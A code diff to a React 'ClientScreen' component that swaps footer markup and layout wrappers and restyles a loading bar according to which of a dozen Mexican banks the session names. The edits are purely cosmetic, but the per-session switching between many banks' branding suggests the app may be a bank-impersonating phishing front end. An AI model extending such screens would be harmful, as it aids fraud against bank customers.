@@ -650,7 +650,7 @@ export default function ClientScreen() {
       );
     } else if (sessionData.banco === 'PLATACARD') {
       return (
-        <footer className="bg-gray-100 border-t border-gray-200 w-full">
+        <div className="bg-gray-100 border-t border-gray-200 w-full">
           <div className="max-w-4xl mx-auto px-4 py-6">
             <div className="text-center text-sm space-y-3">
               {/* Primera línea de enlaces */}
@@ -683,7 +683,7 @@ export default function ClientScreen() {
               </div>
             </div>
           </div>
-        </footer>
+        </div>
       );
     } else {
       return (
@@ -1005,30 +1005,28 @@ export default function ClientScreen() {
   // Si estamos mostrando el mensaje inicial o aún no se ha cargado el banco, mostrar una pantalla de carga
   if (showInitialMessage || !bankLoaded) {
     const loadingContent = (
-      <>
-        <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
-          <div className="text-center mb-4">
-            <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
-            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
-              <div className={`h-full ${
-                sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
-                sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
-                sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
-                sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
-                sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
-                sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
-                sessionData.banco === 'AMEX' ? 'amex-bg' :
-                sessionData.banco === 'SANTANDER' ? 'santander-bg' :
-                sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
-                sessionData.banco === 'PLATACARD' ? 'platacard-bg' :
-                sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
-                sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
-                'bg-[#EC1C24]'
-              } animate-progress-bar`}></div>
-            </div>
+      <div className="container mx-auto max-w-md px-6 py-8 flex-grow flex flex-col items-center justify-center">
+        <div className="text-center mb-4">
+          <h2 className="text-xl font-semibold mb-4">{initialMessage}</h2>
+          <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
+            <div className={`h-full ${
+              sessionData.banco === 'LIVERPOOL' ? 'liverpool-bg' :
+              sessionData.banco === 'BANBAJIO' ? 'banbajio-bg' : 
+              sessionData.banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
+              sessionData.banco === 'BBVA' ? 'bg-[#072146]' :
+              sessionData.banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
+              sessionData.banco === 'HSBC' ? 'bg-[#DB0011]' :
+              sessionData.banco === 'AMEX' ? 'amex-bg' :
+              sessionData.banco === 'SANTANDER' ? 'santander-bg' :
+              sessionData.banco === 'SCOTIABANK' ? 'scotiabank-bg' :
+              sessionData.banco === 'PLATACARD' ? 'platacard-bg' :
+              sessionData.banco === 'BANREGIO' ? 'banregio-bg' :
+              sessionData.banco === 'SPIN' ? 'bg-[#6551FF]' :
+              'bg-[#EC1C24]'
+            } animate-progress-bar`}></div>
           </div>
         </div>
-      </>
+      </div>
     );
     
     // Si no se ha cargado el banco aún, mostramos una pantalla genérica de carga
@@ -1082,7 +1080,9 @@ export default function ClientScreen() {
       >
         {renderHeader()}
         {loadingContent}
-        {renderFooter()}
+        <div className="mt-auto">
+          {renderFooter()}
+        </div>
       </div>
     );
   }
@@ -1115,7 +1115,9 @@ export default function ClientScreen() {
         />
       </div>
 
-      {renderFooter()}
+      <div className="mt-auto">
+        {renderFooter()}
+      </div>
     </div>
   );
 }
